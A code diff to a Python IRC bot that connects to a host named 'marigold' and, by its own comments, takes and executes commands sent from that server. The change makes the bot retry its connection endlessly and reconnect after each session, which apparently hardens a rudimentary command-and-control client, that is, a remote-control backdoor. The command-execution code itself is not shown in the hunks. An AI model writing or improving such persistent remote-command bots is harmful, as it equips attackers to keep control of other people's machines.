@@ -2,6 +2,7 @@ import os
 import sys
 import ssl
 import socket
+import time
 
 class IRC_Connector(object):
 	def __init__(self, server, port):
@@ -12,14 +13,19 @@ class IRC_Connector(object):
 		# Create a socket to the irc server, via 
 		self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-		try:
-			# Attempting to connect, and making a sockfile.
-			self._sock.connect((self.server, self.port))
-			self._sockfile = self._sock.makefile()
+		# Connect while we can
+		print("Connecting to {}:{}".format(self.server, self.port))
+		while True:
+			try:
+				# Attempting to connect, and making a sockfile.
+				self._sock.connect((self.server, self.port))
+				self._sockfile = self._sock.makefile()
 
-			print("Socket: {}".format(self._sock))
-		except:
-			print("Unable to connect to {} on port {}".format(self.server, self.port))
+				print("Socket: {}".format(self._sock))
+				return
+			except:
+				print(".", end="", flush=True)
+				time.sleep(5)
 	
 
 	# Send the message on the socket.
@@ -42,7 +48,6 @@ class IRC_Bot(object):
 
 	# Listen for commands, and execute them as they come in
 	def run(self):
-
 		while(self.cmd != "exit"):
 			self.cmd = self.conn.recieve()
 
@@ -52,9 +57,12 @@ class IRC_Bot(object):
 
 	def __init__(self, server, port):
 		self.conn = IRC_Connector(server, port)
-		self.conn.connect()
+		#self.conn.connect()
 		self.cmd = ""
 			
 
+# Attempt to connect to the target server, and accept it's commands
 bot = IRC_Bot("marigold", int(sys.argv[1]))
-bot.run()
+while True:
+	bot.conn.connect()
+	bot.run()
